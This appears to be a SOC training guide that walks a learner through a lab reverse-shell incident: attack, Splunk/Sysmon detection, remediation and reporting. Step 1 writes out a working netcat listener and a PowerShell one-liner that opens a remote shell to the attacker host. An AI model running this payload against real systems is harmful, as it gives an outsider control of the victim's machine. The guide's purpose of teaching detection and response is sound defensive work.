# Job Training: Incident Lifecycle Simulation

To get a job in a SOC, you need to show you can **Detect**, **Analyze**, **Remediate**, and **Document**. This guide walks you through a real-world "Reverse Shell" scenario.

---

## 🏗️ The Scenario
**Attacker (Kali Linux - 192.168.50.30):** Launches a phishing attack or exploits a vulnerability to gain a shell.
**Victim (Windows 11 - 192.168.50.20):** Connects back to the attacker.

---

## ⚔️ Step 1: The Attack (Execution)

### 1. Start the Listener (Kali)
Run this command to wait for the victim to "call home":
```bash
nc -lvnp 4444
```

### 2. Trigger the Shell (Windows 11)
Paste this into a **Standard (non-admin) PowerShell** window:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.50.30", 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()
```

**Success Check:** Go back to Kali. You should see a prompt: `PS C:\Users\stacy >`. You now "own" the box.

---

## 🔍 Step 2: The Detection (Analysis)

Now, act as the **Analyst**. Open Splunk and search for:
```spl
index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 dest_port=4444
```
- **Look for:** What process started this? (Hint: `powershell.exe`)
- **Pivot:** Use the `ProcessGuid` from that event to find the original process creation (EventCode 1).

---

## 🛠️ Step 3: The Fix (Remediation)

In a real job, you can't just leave the shell open. 
1. **Identify the PID:** Find the Process ID (PID) in Splunk or Task Manager.
2. **Standard Kill:** On the Windows 11 VM, stop the malicious process.
3. **Draft the "Lesson Learned":** Why was PowerShell allowed to make an outbound connection to port 4444? (Answer: Egress filtering was missing).

---

## 📝 Step 4: The Report (Documentation)

I will help you write the report in `Incident_Reports/006_reverse_shell_sim.md` once you have the detection data!
